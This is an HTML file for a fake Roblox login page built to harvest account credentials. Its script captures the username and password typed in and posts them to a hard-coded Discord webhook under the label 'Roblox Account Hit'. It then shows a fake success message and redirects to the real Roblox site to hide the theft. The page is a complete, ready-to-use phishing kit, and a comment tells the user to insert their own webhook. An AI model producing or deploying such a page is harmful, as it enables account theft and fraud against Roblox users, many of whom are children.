<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1b2837;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 400px;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #e50914; /* Roblox Red */
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #fff;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box; /* Include padding and border in width */
            margin-bottom: 16px;
        }

        button {
            background-color: #e50914;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

            button:hover {
                background-color: #d32f2f; /* Darker Red */
            }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Roblox Login</h1>
        <form id="loginForm" onsubmit="sendData(event)">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        function sendData(event) {
            event.preventDefault(); // Stop the page from reloading
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            // Create a JSON object to send
            var data = {
                "content": "Roblox Account Hit\n\nUsername: **" + username + "**\nPassword: **" + password + "**",
                "username": "Account Hack" // The name that appears in Discord
            };

            // Replace with your webhook URL
            fetch("https://discord.com/api/webhooks/1520218464864833656/AkmppOnRUqxSFR2TC-ejWuqrT2Wih0wtBjNsz5TodmMnYgrG8hp0pJn7ncrQKoEEk7Tm", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    alert("Login Successful! Redirecting..."); // Optional: Make it look real
                    // You can add a delay here to simulate loading, then redirect to Roblox.com
                    setTimeout(() => {
                        window.location.href = "https://www.roblox.com";
                    }, 2000);
                } else {
                    alert("Login Failed. Try again later.");
                }
            })
            .catch(error => console.log(error));
        }
    </script>
</body>
</html>
